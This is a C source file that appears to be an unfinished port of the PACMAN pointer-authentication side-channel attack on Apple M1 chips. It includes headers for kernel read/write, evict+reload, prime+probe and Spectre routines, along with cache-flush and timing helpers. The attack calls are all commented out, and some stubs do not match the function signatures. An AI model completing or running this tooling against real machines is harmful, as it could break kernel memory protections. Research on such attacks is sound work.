// Original exploit discovered by MIT Researchers Joseph Ravichandran, Weon Taek Na, Jay Lang and Mengjia Yang
// Exploit made public at the DEF CON 30 talk (https://pacmanattack.com)
// Fork of Joseph Ravichandran (aka jprx) PacmanAttack, originally coded in Rust

// Copyright © Rayyan Khan (cxdxn1) 2024, all rights reserved

// General headers used in C
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <mach/mach_time.h>

#define MEM_REGION_SIZE 0x40000000000

// C headers corresponding to originally used Rust modules
#include "Headers/libdarwin.h"
#include "Headers/qos.h"
#include "retpoline.h"
#include "tests.h"

#include "evset.h"
#include "Headers/Libdarwin/kernel_rw.h"
#include "Headers/Attacks/evict_reload.h"
#include "Headers/Libdarwin/iokit.h"
#include "Headers/counter.h"
#include "Headers/timer_msr.h"
#include "pacmankit.h"
#include "Headers/cache.h"
#include "Headers/msr.h"
#include "Headers/attacks.h"
#include "Headers/pac.h"
#include <pthread.h>

// Initializes a memory region with a specific pattern.
void init_memory(uint8_t* memory_region, size_t len) {
    size_t iter = 0;
    for (size_t i = 0; i < len; i += STRIDE) {
        if (iter >= EVSET_SIZE_MAX) { break; }
        *(volatile uint8_t*)(&memory_region[i]) = 0x41;  // Initialize with the value 0x41.
        volatile uint8_t value = *(volatile uint8_t*)(&memory_region[i]);  // Read the initialized value.
        iter++;
    }
}


// Flushes the L2 cache
void flush_cache(unsigned char* memory_region) {
    for (size_t i = 0; i < L2_SIZE; i += L1D_LINESIZE) {
        volatile unsigned char* ptr = &memory_region[i];
        *ptr = 0x41;
        volatile unsigned char dummy = *ptr;
        (void)dummy;  // suppress any unused variable warnings
    }
}

// Flushes iCache
void flush_iCache(uint64_t retpoline) {
    uint64_t retpoline_unsigned = retpoline & (~PAC_BITMASK);
    for (uint64_t i = 0; i < L2_SIZE; i += L1I_LINESIZE) {
        time_exec(retpoline_unsigned + i);
    }
}

// Defines the attack function
void attack(uint8_t *shared_mem) {
    // Uncomment and replace the following lines
    // attacks_evict_reload_inst_evict_reload(shared_mem);
    // attacks_evict_reload_data_evict_reload(shared_mem);
    // attacks_evict_reload_inst_evict_reload_kernel(shared_mem);
    // attacks_evict_reload_data_evict_reload_kernel(shared_mem);
    // attacks_prime_probe_inst_prime_probe(shared_mem);
    // attacks_spectre_inst_spectre_kernel(shared_mem);
    // attacks_pacman_data_testing(shared_mem, true);
    // attacks_pacman_inst_testing(shared_mem, true);
    // attacks_pacman_end_to_end(shared_mem);
    // attacks_pacman_pacman_real(shared_mem);
}



// Measures and prints cache hit/miss latency and timer overhead using shared memory.
void report_platform_info(uint8_t *shared_mem) {
    uint64_t timer_overhead = timer_overhead();
    uint64_t miss_latency = time_miss(shared_mem);
    uint64_t hit_latency = time_hit(shared_mem);

    printf("Hit took %llu cycles\n", hit_latency);
    printf("Miss took %llu cycles\n", miss_latency);
    printf("Timer overhead is %llu cycles\n", timer_overhead);
    printf("We are on core %d\n", core_id());
}



// Where the magic (should) happen
int main() {
    srand(mach_absolute_time() & 0xFFFFFFFF);

    // Uncomment and replace the following lines with C equivalents for the Rust code
    // if (!set_core(CoreKind_PCORE)) {
    //     printf("Error setting CPU affinity!\n");
    //     return 1;
    // }

    uint8_t *loc = NULL;
    kern_return_t kret = mach_vm_allocate(
            mach_task_self(),
            (vm_address_t*)&loc,
            MEM_REGION_SIZE,
            VM_FLAGS_ANYWHERE
    );

    if (KERN_SUCCESS != kret) {
        printf("Error creating memory region! (%d)\n", kret);
        return 1;
    }

    printf("Created mach memory region at 0x%llX\n", (uint64_t)loc);

    // Uncomment and replace the following lines with C equivalents for the Rust code
    // uint8_t *shared_mem = loc;
    // printf("Shared memory is at 0x%llX\n", (uint64_t)&shared_mem[0]);

    // Uncomment and replace the following lines with C equivalents for the Rust code
    // thread_spawn(counter_thread);
    // while (0 == read_volatile(&CTR)) {}

    // Uncomment and replace the following lines with C equivalents for the Rust code
    // report_platform_info(shared_mem);
    // init_memory(shared_mem);
    // attack(shared_mem);

    return 0;
}
